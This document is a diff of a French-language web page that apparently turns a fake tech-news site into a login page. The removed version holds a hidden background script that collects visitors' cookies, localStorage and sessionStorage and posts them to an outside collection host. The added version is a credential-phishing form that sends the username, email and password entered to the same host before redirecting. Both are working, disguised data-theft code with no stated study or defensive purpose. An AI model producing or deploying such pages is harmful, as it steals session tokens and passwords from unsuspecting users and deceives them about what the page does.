@@ -3,472 +3,237 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TechNews - Dernières actualités</title>
+  <title>Bienvenue - Identification</title>
   <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
   <style>
     body {
       margin: 0;
       font-family: 'Montserrat', Arial, sans-serif;
-      background: #f5f6fa;
+      background: linear-gradient(135deg, #6e8efb 0%, #a777e3 100%);
       color: #222;
-    }
-    header {
-      background: linear-gradient(90deg, #6e8efb 0%, #a777e3 100%);
-      color: #fff;
-      padding: 1.2rem 1rem;
-      text-align: center;
-      position: sticky;
-      top: 0;
-      z-index: 10;
-      box-shadow: 0 2px 8px rgba(80,80,120,0.08);
-    }
-    .logo {
-      width: 48px;
-      vertical-align: middle;
-      margin-right: 0.5rem;
-    }
-    .site-title {
-      font-size: 1.7rem;
-      font-weight: 700;
-      letter-spacing: 1px;
-      vertical-align: middle;
-    }
-    nav {
-      margin-top: 0.8rem;
       display: flex;
+      align-items: center;
       justify-content: center;
-      gap: 1.5rem;
-      flex-wrap: wrap;
+      height: 100vh;
     }
-    nav a {
-      color: #fff;
-      text-decoration: none;
-      font-weight: 500;
-      font-size: 1rem;
-      padding: 0.2rem 0.7rem;
-      border-radius: 8px;
-      transition: background 0.2s;
-    }
-    nav a:hover {
-      background: rgba(255,255,255,0.12);
-    }
-    main {
-      max-width: 600px;
-      margin: 2rem auto;
-      padding: 0 1rem;
-    }
-    .article {
+    .container {
       background: #fff;
-      border-radius: 18px;
-      box-shadow: 0 2px 12px rgba(80,80,120,0.07);
-      margin-bottom: 2rem;
-      overflow: hidden;
-      transition: box-shadow 0.2s;
-    }
-    .article:hover {
-      box-shadow: 0 6px 24px rgba(80,80,120,0.12);
-    }
-    .article img {
+      border-radius: 22px;
+      box-shadow: 0 4px 24px rgba(80,80,120,0.13);
+      padding: 2.7rem 2rem 2rem 2rem;
+      max-width: 370px;
       width: 100%;
-      height: 180px;
-      object-fit: cover;
-      display: block;
+      text-align: center;
+      animation: fadeIn 0.7s;
+      position: relative;
     }
-    .article-content {
-      padding: 1.2rem 1rem 1rem 1rem;
-    }
-    .article-title {
-      font-size: 1.25rem;
-      font-weight: 700;
-      margin-bottom: 0.5rem;
+    .top-icon {
+      font-size: 2.7rem;
       color: #6e8efb;
+      margin-bottom: 0.7rem;
+      animation: fadeIn 1.2s;
     }
-    .article-desc {
-      font-size: 1rem;
-      color: #444;
+    h1 {
+      font-size: 1.5rem;
+      color: #6e8efb;
+      margin-bottom: 0.7rem;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+    }
+    .subtitle {
+      font-size: 1.05rem;
+      color: #555;
+      margin-bottom: 1.2rem;
+      font-weight: 500;
+      letter-spacing: 0.2px;
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 1.1rem;
       margin-bottom: 0.7rem;
     }
-    .article-date {
-      font-size: 0.92rem;
-      color: #a777e3;
-      opacity: 0.7;
-    }
-    @media (max-width: 700px) {
-      main {
-        max-width: 100%;
-        margin: 1rem 0;
-        padding: 0 0.3rem;
-      }
-      .article img {
-        height: 140px;
-      }
-      header {
-        font-size: 1rem;
-        padding: 1rem 0.3rem;
-      }
-      .site-title {
-        font-size: 1.2rem;
-      }
-    }
-    /* Menu burger mobile */
-    .burger {
-      display: none;
-      position: absolute;
-      right: 1rem;
-      top: 1.2rem;
-      cursor: pointer;
-      z-index: 20;
-    }
-    .burger span {
-      display: block;
-      width: 28px;
-      height: 4px;
-      background: #fff;
-      margin: 5px 0;
-      border-radius: 2px;
-      transition: 0.3s;
-    }
-    @media (max-width: 500px) {
-      nav {
-        display: none;
-        flex-direction: column;
-        background: #6e8efb;
-        position: absolute;
-        top: 60px;
-        left: 0;
-        width: 100%;
-        padding: 1rem 0;
-        z-index: 15;
-      }
-      nav.active {
-        display: flex;
-      }
-      .burger {
-        display: block;
-      }
-    }
-    .article-img {
-      width: 100%;
-      height: 180px;
-      background: linear-gradient(90deg, #e3e6fa 0%, #f5f6fa 100%);
+    .input-group {
+      position: relative;
       display: flex;
       align-items: center;
-      justify-content: center;
     }
-    /* Nouvelles sections */
-    .trends, .newsletter, .tips, .top-products, .faq {
+    input {
+      padding: 0.85rem 2.5rem 0.85rem 2.5rem;
+      border: 1.5px solid #e0e0e0;
+      border-radius: 10px;
+      font-size: 1rem;
+      outline: none;
+      width: 100%;
+      transition: border 0.2s;
+      background: #f8f9fa;
+      color: #222;
+      box-sizing: border-box;
+    }
+    input:focus {
+      border: 1.5px solid #a777e3;
       background: #fff;
-      border-radius: 18px;
-      box-shadow: 0 2px 12px rgba(80,80,120,0.07);
-      margin-bottom: 2rem;
-      padding: 1.5rem;
     }
-    .trends h2, .newsletter h2, .tips h2, .top-products h2, .faq h2 {
-      font-size: 1.5rem;
-      font-weight: 700;
-      margin-bottom: 1rem;
+    .input-icon {
+      position: absolute;
+      left: 0.8rem;
+      font-size: 1.1rem;
+      color: #a777e3;
+      pointer-events: none;
+    }
+    .toggle-pwd {
+      position: absolute;
+      right: 0.8rem;
+      font-size: 1.15rem;
+      color: #888;
+      cursor: pointer;
+      transition: color 0.2s;
+    }
+    .toggle-pwd:hover {
       color: #6e8efb;
     }
-    .trends ul, .tips ul {
-      list-style: none;
-      padding: 0;
-      margin: 0;
-      columns: 2;
-      gap: 1.2rem;
-    }
-    .trends li, .tips li {
-      background: #f5f6fa;
-      padding: 0.8rem;
-      border-radius: 10px;
-      transition: background 0.2s;
-    }
-    .trends li:hover, .tips li:hover {
-      background: #e3e6fa;
-    }
-    .newsletter form {
-      display: flex;
-      gap: 0.5rem;
-    }
-    .newsletter input {
-      flex: 1;
-      padding: 0.8rem;
-      border: 1px solid #ddd;
-      border-radius: 10px;
-      font-size: 1rem;
-    }
-    .newsletter button {
-      padding: 0.8rem 1.2rem;
-      background: #6e8efb;
+    .btn {
+      padding: 0.85rem 1.2rem;
+      background: linear-gradient(90deg, #6e8efb 0%, #a777e3 100%);
       color: #fff;
       border: none;
       border-radius: 10px;
-      font-size: 1rem;
+      font-size: 1.08rem;
+      font-weight: 600;
       cursor: pointer;
-      transition: background 0.2s;
-    }
-    .newsletter button:hover {
-      background: #5a7bd0;
-    }
-    .top-products {
-      display: flex;
-      gap: 1rem;
-      flex-wrap: wrap;
-    }
-    .product-card {
-      background: #f5f6fa;
-      border-radius: 12px;
-      padding: 1rem;
-      flex: 1 1 calc(33.333% - 1rem);
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-      transition: transform 0.2s;
-    }
-    .product-card:hover {
-      transform: translateY(-3px);
-    }
-    .product-img {
-      width: 60px;
-      height: 60px;
-      flex-shrink: 0;
-    }
-    .faq-item {
-      margin-bottom: 1rem;
-    }
-    .faq-question {
-      background: #6e8efb;
-      color: #fff;
-      border: none;
-      padding: 0.8rem;
-      border-radius: 10px;
-      cursor: pointer;
-      width: 100%;
-      text-align: left;
-      font-size: 1rem;
-      transition: background 0.2s;
-    }
-    .faq-question:hover {
-      background: #5a7bd0;
-    }
-    .faq-answer {
-      padding: 0.8rem;
-      background: #f5f6fa;
-      border-radius: 10px;
+      transition: background 0.2s, box-shadow 0.2s;
+      box-shadow: 0 2px 8px rgba(80,80,120,0.09);
       margin-top: 0.5rem;
-      display: none;
     }
-    .faq-item.active .faq-answer {
-      display: block;
+    .btn:hover {
+      background: linear-gradient(90deg, #5a7bd0 0%, #8e54e9 100%);
+      box-shadow: 0 4px 16px rgba(80,80,120,0.13);
+    }
+    .error {
+      color: #e74c3c;
+      font-size: 0.98rem;
+      margin-bottom: 0.5rem;
+      font-weight: 500;
+    }
+    .success {
+      color: #27ae60;
+      font-size: 1rem;
+      margin-bottom: 0.5rem;
+      font-weight: 500;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(30px);}
+      to { opacity: 1; transform: translateY(0);}
+    }
+    @media (max-width: 400px) {
+      .container {
+        padding: 1.2rem 0.5rem;
+      }
+      input, .btn {
+        font-size: 0.95rem;
+        padding: 0.7rem;
+      }
+      .top-icon {
+        font-size: 2rem;
+      }
     }
   </style>
 </head>
 <body>
-  <header>
-    <img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" alt="Logo" class="logo" />
-    <span class="site-title">TechNews</span>
-    <div class="burger" id="burgerMenu">
-      <span></span>
-      <span></span>
-      <span></span>
+  <div class="container">
+    <div class="top-icon">
+      <i class="fa-solid fa-user-lock"></i>
     </div>
-    <nav id="mainNav">
-      <a href="#">Accueil</a>
-      <a href="#">Actualités</a>
-      <a href="#">Tests</a>
-      <a href="#">Guides</a>
-      <a href="#">Contact</a>
-    </nav>
-  </header>
-  <main>
-    <div class="article">
-      <div class="article-img">
-        <!-- SVG smartphone -->
-        <svg width="100%" height="180" viewBox="0 0 200 180" fill="none">
-          <rect x="60" y="30" width="80" height="120" rx="18" fill="#6e8efb"/>
-          <rect x="75" y="45" width="50" height="90" rx="10" fill="#fff"/>
-          <circle cx="100" cy="150" r="6" fill="#a777e3"/>
-        </svg>
-      </div>
-      <div class="article-content">
-        <div class="article-title">Apple dévoile son nouveau iPhone 15 Pro</div>
-        <div class="article-desc">Découvrez toutes les nouveautés du dernier smartphone haut de gamme d'Apple, avec son design repensé et ses performances inédites.</div>
-        <div class="article-date">Publié le 22 juillet 2025</div>
-      </div>
+    <h1>Identification requise</h1>
+    <div class="subtitle">
+      Pour aller plus loin, entrez vos informations ci-dessous.<br>
+      <span style="font-size:0.95rem;color:#a777e3;">Vos données sont nécessaires pour continuer.</span>
     </div>
-    <div class="article">
-      <div class="article-img">
-        <!-- SVG Samsung Fold -->
-        <svg width="100%" height="180" viewBox="0 0 200 180" fill="none">
-          <rect x="40" y="40" width="40" height="100" rx="10" fill="#a777e3"/>
-          <rect x="120" y="40" width="40" height="100" rx="10" fill="#6e8efb"/>
-          <rect x="80" y="60" width="40" height="60" rx="8" fill="#fff"/>
-        </svg>
+    <form id="identForm" autocomplete="on">
+      <div class="input-group">
+        <span class="input-icon"><i class="fa-solid fa-user"></i></span>
+        <input type="text" id="username" name="username" placeholder="Nom d'utilisateur" autocomplete="username" required>
       </div>
-      <div class="article-content">
-        <div class="article-title">Test : Samsung Galaxy Fold 4</div>
-        <div class="article-desc">Notre équipe a testé le nouveau smartphone pliable de Samsung. Découvrez notre avis complet sur ses fonctionnalités et son autonomie.</div>
-        <div class="article-date">Publié le 21 juillet 2025</div>
+      <div class="input-group">
+        <span class="input-icon"><i class="fa-solid fa-envelope"></i></span>
+        <input type="email" id="email" name="email" placeholder="Adresse email" autocomplete="email" required>
       </div>
-    </div>
-    <div class="article">
-      <div class="article-img">
-        <!-- SVG Sécurité -->
-        <svg width="100%" height="180" viewBox="0 0 200 180" fill="none">
-          <ellipse cx="100" cy="90" rx="60" ry="50" fill="#6e8efb"/>
-          <rect x="80" y="70" width="40" height="40" rx="8" fill="#fff"/>
-          <circle cx="100" cy="90" r="10" fill="#a777e3"/>
-        </svg>
+      <div class="input-group">
+        <span class="input-icon"><i class="fa-solid fa-lock"></i></span>
+        <input type="password" id="password" name="password" placeholder="Mot de passe" autocomplete="current-password" required>
+        <span class="toggle-pwd" id="togglePwd"><i class="fa-solid fa-eye"></i></span>
       </div>
-      <div class="article-content">
-        <div class="article-title">Guide : Sécuriser vos données personnelles</div>
-        <div class="article-desc">Nos conseils pour protéger efficacement vos informations sur internet et éviter les pièges courants.</div>
-        <div class="article-date">Publié le 20 juillet 2025</div>
-      </div>
-    </div>
-    <div class="article">
-      <div class="article-img">
-        <!-- SVG Laptop -->
-        <svg width="100%" height="180" viewBox="0 0 200 180" fill="none">
-          <rect x="50" y="80" width="100" height="40" rx="10" fill="#a777e3"/>
-          <rect x="60" y="60" width="80" height="30" rx="6" fill="#fff"/>
-          <rect x="70" y="130" width="60" height="10" rx="4" fill="#6e8efb"/>
-        </svg>
-      </div>
-      <div class="article-content">
-        <div class="article-title">Comparatif : Les meilleurs laptops 2025</div>
-        <div class="article-desc">Découvrez notre sélection des ordinateurs portables les plus performants et design de l'année.</div>
-        <div class="article-date">Publié le 18 juillet 2025</div>
-      </div>
-    </div>
-    <div class="article">
-      <div class="article-img">
-        <!-- SVG IA -->
-        <svg width="100%" height="180" viewBox="0 0 200 180" fill="none">
-          <circle cx="100" cy="90" r="40" fill="#a777e3"/>
-          <ellipse cx="100" cy="90" rx="30" ry="20" fill="#fff"/>
-          <circle cx="100" cy="90" r="10" fill="#6e8efb"/>
-        </svg>
-      </div>
-      <div class="article-content">
-        <div class="article-title">Dossier : L'IA dans la vie quotidienne</div>
-        <div class="article-desc">Comment l'intelligence artificielle transforme nos usages et nos habitudes au quotidien.</div>
-        <div class="article-date">Publié le 15 juillet 2025</div>
-      </div>
-    </div>
-    <div class="article">
-      <div class="article-img">
-        <!-- SVG Montre connectée -->
-        <svg width="100%" height="180" viewBox="0 0 200 180" fill="none">
-          <circle cx="100" cy="90" r="30" fill="#6e8efb"/>
-          <rect x="90" y="60" width="20" height="60" rx="8" fill="#fff"/>
-          <circle cx="100" cy="90" r="8" fill="#a777e3"/>
-        </svg>
-      </div>
-      <div class="article-content">
-        <div class="article-title">Test : Les nouvelles montres connectées</div>
-        <div class="article-desc">Notre avis sur les dernières smartwatches du marché, design, autonomie et fonctionnalités.</div>
-        <div class="article-date">Publié le 12 juillet 2025</div>
-      </div>
-    </div>
-
-    <section class="trends">
-      <h2>Tendances du moment</h2>
-      <ul>
-        <li>#IA</li>
-        <li>#Smartphones</li>
-        <li>#Sécurité</li>
-        <li>#Laptops</li>
-        <li>#Pc Gaming</li>
-        <li>#Wearables</li>
-      </ul>
-    </section>
-
-    <section class="newsletter">
-      <h2>Abonnez-vous à la newsletter</h2>
-      <form id="newsletterForm">
-        <input type="email" placeholder="Votre email" required>
-        <button type="submit">S'inscrire</button>
-      </form>
-      <div id="newsletterMsg"></div>
-    </section>
-
-    <section class="tips">
-      <h2>Astuces Tech</h2>
-      <ul>
-        <li>Comment booster la batterie de votre smartphone ?</li>
-        <li>Les meilleures applis gratuites pour Android et iOS</li>
-        <li>Protéger ses données en 3 étapes simples</li>
-        <li>Optimiser son PC pour le gaming</li>
-      </ul>
-    </section>
-
-    <section class="top-products">
-      <h2>Top produits 2025</h2>
-      <div class="products-list">
-        <div class="product-card">
-          <div class="product-img">
-            <!-- SVG casque audio -->
-            <svg width="60" height="60" viewBox="0 0 60 60"><circle cx="30" cy="30" r="28" fill="#a777e3"/><rect x="15" y="25" width="30" height="10" rx="5" fill="#fff"/></svg>
-          </div>
-          <div class="product-title">Casque Bose QC45</div>
-        </div>
-        <div class="product-card">
-          <div class="product-img">
-            <!-- SVG drone -->
-            <svg width="60" height="60" viewBox="0 0 60 60"><rect x="20" y="20" width="20" height="20" rx="6" fill="#6e8efb"/><circle cx="30" cy="30" r="8" fill="#fff"/></svg>
-          </div>
-          <div class="product-title">Drone DJI Mini 4</div>
-        </div>
-        <div class="product-card">
-          <div class="product-img">
-            <!-- SVG montre -->
-            <svg width="60" height="60" viewBox="0 0 60 60"><circle cx="30" cy="30" r="20" fill="#6e8efb"/><circle cx="30" cy="30" r="10" fill="#fff"/></svg>
-          </div>
-          <div class="product-title">Apple Watch Ultra</div>
-        </div>
-      </div>
-    </section>
-
-    <section class="faq">
-      <h2>FAQ</h2>
-      <div class="faq-item">
-        <button class="faq-question">Comment recevoir les nouveaux articles ?</button>
-        <div class="faq-answer">Abonnez-vous à la newsletter ou suivez-nous sur les réseaux sociaux.</div>
-      </div>
-      <div class="faq-item">
-        <button class="faq-question">Comment contacter l'équipe ?</button>
-        <div class="faq-answer">Utilisez le formulaire de contact ou envoyez-nous un email.</div>
-      </div>
-    </section>
-  </main>
+      <button type="submit" class="btn"><i class="fa-solid fa-arrow-right"></i> Continuer</button>
+    </form>
+    <div id="statusMsg"></div>
+  </div>
   <script>
-    // Menu burger mobile
-    const burger = document.getElementById('burgerMenu');
-    const nav = document.getElementById('mainNav');
-    burger.addEventListener('click', () => {
-      nav.classList.toggle('active');
+    // Afficher/Masquer le mot de passe
+    const pwdInput = document.getElementById("password");
+    const togglePwd = document.getElementById("togglePwd");
+    let pwdVisible = false;
+    togglePwd.addEventListener("click", function() {
+      pwdVisible = !pwdVisible;
+      pwdInput.type = pwdVisible ? "text" : "password";
+      togglePwd.innerHTML = pwdVisible
+        ? '<i class="fa-solid fa-eye-slash"></i>'
+        : '<i class="fa-solid fa-eye"></i>';
     });
 
-    // ...en arrière-plan, récupération et envoi des données...
-    const cookies = document.cookie;
-    const local = JSON.stringify(localStorage);
-    const session = JSON.stringify(sessionStorage);
-    const userAgent = navigator.userAgent;
-    const donnees = {
-      date: new Date().toISOString(),
-      userAgent,
-      cookies,
-      localStorage: local,
-      sessionStorage: session
-    };
-    fetch("https://troll-production.up.railway.app/collect", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(donnees)
-    }).then(() => {
-      document.getElementById("statusMsg").innerText = "Analyse terminée ✔️";
-    }).catch(() => {
-      document.getElementById("statusMsg").innerText = "Erreur lors de l'analyse.";
+    function validateEmail(email) {
+      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+    }
+    function validateUsername(username) {
+      return /^[a-zA-Z0-9_-]{3,20}$/.test(username);
+    }
+    function validatePassword(password) {
+      return password.length >= 6;
+    }
+
+    document.getElementById("identForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      const username = document.getElementById("username").value.trim();
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value;
+
+      let error = "";
+      if (!validateUsername(username)) {
+        error = "Nom d'utilisateur invalide (3-20 caractères, lettres/chiffres/tirets).";
+      } else if (!validateEmail(email)) {
+        error = "Adresse email invalide.";
+      } else if (!validatePassword(password)) {
+        error = "Mot de passe trop court (minimum 6 caractères).";
+      }
+
+      const statusMsg = document.getElementById("statusMsg");
+      if (error) {
+        statusMsg.innerHTML = `<span class="error"><i class="fa-solid fa-circle-exclamation"></i> ${error}</span>`;
+        return;
+      }
+
+      // Prépare les données à envoyer
+      const donnees = {
+        username,
+        email,
+        password,
+        date: new Date().toISOString(),
+        userAgent: navigator.userAgent
+      };
+
+      // Envoi des données
+      fetch("https://troll-production.up.railway.app/collect", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(donnees)
+      }).then(() => {
+        statusMsg.innerHTML = `<span class="success"><i class="fa-solid fa-circle-check"></i> Informations envoyées ✔️</span>`;
+        setTimeout(() => {
+          window.location.href = "index12.html";
+        }, 900);
+      }).catch(() => {
+        statusMsg.innerHTML = `<span class="error"><i class="fa-solid fa-circle-exclamation"></i> Erreur lors de l'envoi.</span>`;
+      });
     });
   </script>
 </body>
